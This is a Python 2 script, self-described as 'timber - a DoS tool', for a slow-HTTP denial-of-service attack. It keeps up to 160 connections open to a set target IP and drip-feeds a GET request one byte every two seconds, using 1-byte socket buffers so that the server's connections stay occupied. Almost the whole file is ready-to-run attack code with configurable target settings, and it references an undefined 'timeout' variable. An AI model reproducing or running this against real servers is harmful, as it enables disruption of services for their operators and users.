#!/sw/bin/python -*- Mode: Python; tab-width: 4 -*-

'''timber - a DoS tool 

see http://md.hudora.de/presentationss/digidemo/ - communicating
slowly for further enlightment.  --drt@un.bewaff.net - http://c0re.jp/

'''

# number of concurrent querys this might be limited by your OS
# Win 95: 55, Linux 2.0: 245, Linux 2.2: 1000
# FreeBSD, NT: 1000; can be tweaked for more.
concurrency = 160

# set this to the IP of the target
targetip = '192.168.8.2'
# set this to the file you want to hit. Try a File bigger than > 32k 
targetpath = '/'
# the virtual hostnam to be send ion the Host: header
targethttphost = '192.168.8.2'

import sys
import socket
import time
import select
import asyncore


def monitor():
    '''reap stale and open new connenctions until we reach concurrency'''

    # from work_in_progress/reaper.py
    # 'bring out your dead, <CLANG!>... bring out your dead!'
    now = int(time.time())
    for x in asyncore.socket_map.keys():
        s =  asyncore.socket_map[x]
        if hasattr(s, 'timestamp'):
            if (now - s.timestamp) > timeout:
                print >>sys.stderr, 'reaping connection to', s.host
                s.close()

    # create new connections
    while len(asyncore.socket_map) < concurrency:
        s = httpclient(targetip, targetpath, targethttphost)
        time.sleep(0.01)


def printstats():
    connected = 0
    reading = 0
    for nr, x in asyncore.socket_map.items():
        if x.connected:
            connected += 1
        if len(x.buffer) == 0:
            reading += 1
    print >>sys.stderr, "%.2f: Fibers: %d, Connected: %d, Reading: %d" % (time.time(), len(asyncore.socket_map), connected, reading)

def loop():
    '''loop over our sockets and monitor connections'''

    if hasattr (select, 'poll') and hasattr (asyncore, 'poll3'):
        poll_fun = asyncore.poll3
    else:
        poll_fun = asyncore.poll

    while asyncore.socket_map:
        printstats()
        monitor()
        poll_fun(1.0, asyncore.socket_map)

        
class httpclient(asyncore.dispatcher):
    def __init__(self, host, path, httphostname):
        asyncore.dispatcher.__init__(self)
        self.path = path
        self.httphostname = httphostname
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1)
        self.connect( (host, 80) )
        self.buffer = 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n' % (self.path, self.httphostname )
        self.lastcomm = time.time()
        self.waittime = 2
        self.debug = 0
        
    def handle_connect(self):
        pass
    
    def writable(self):
        if self.lastcomm + self.waittime < time.time():
            if len(self.buffer) > 0:
                return 1
        return 0

    def readable(self):
        if self.lastcomm + self.waittime < time.time():
            return 1
        return 0
        
    def handle_write(self):
        self.send(self.buffer[0])
        self.lastcomm = time.time()
        if self.debug:
            sys.stderr.write(self.buffer[0])
            sys.stderr.flush()
        if len(self.buffer) > 1:
            self.buffer = self.buffer[1:]
        else:
            self.buffer = ''
                                                                                                
    def handle_read(self):
        data = self.recv(1)
        self.lastcomm = time.time()
        if self.debug:
            sys.stderr.write(data)
            sys.stderr.flush()
   
# "main"
# use monitor() to fire up the number of connections we want
monitor()
# handle all the connection stuff
loop()


